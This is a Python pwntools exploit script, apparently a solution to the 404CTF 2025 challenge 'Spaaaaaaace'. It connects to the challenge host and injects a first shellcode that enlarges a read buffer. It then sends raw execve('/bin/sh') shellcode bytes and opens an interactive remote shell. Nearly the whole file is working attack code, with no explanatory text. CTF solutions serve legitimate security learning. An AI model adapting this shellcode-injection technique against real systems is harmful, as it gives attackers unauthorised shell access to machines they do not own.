#!/usr/bin/env python3

# Author: Pwnsard
# Challenge: Spaaaaaaace
# CTF: 404CTF 2025

from pwn import *

exe = ELF(b'data/chall')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        return r
    else:
        return remote('challenges.404ctf.fr', 32466)

def size_increase():
    shellcode_asm = """
        mov rax, 800
        mov [rsp + 0x40], rax
        ret
	"""
    shellcode = asm(shellcode_asm, bits=64)
    print(f"Shellcode size : {len(shellcode)}")
    return shellcode

def main():
    global r 
    r = conn()

    r.recvuntil(b"> ")

    print("[*] Increasing read size")
    shellcode = size_increase()

    r.sendline(b"1")
    print(f"Shellcode : {shellcode}")
    r.recvuntil(b"> ")
    r.sendline(shellcode)

    r.recvuntil(b"> ")
    r.sendline(b"2")

    shellcode = [ # excve(/bin/sh)
        0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54,
        0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
    ]

    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"> ")
    print("[*] Sending excve(\"/bin/sh\") shellcode")
    r.sendline(bytes(shellcode))

    r.recvuntil(b"> ")
    r.sendline(b"2")

    r.interactive()

if __name__ == '__main__':
    main()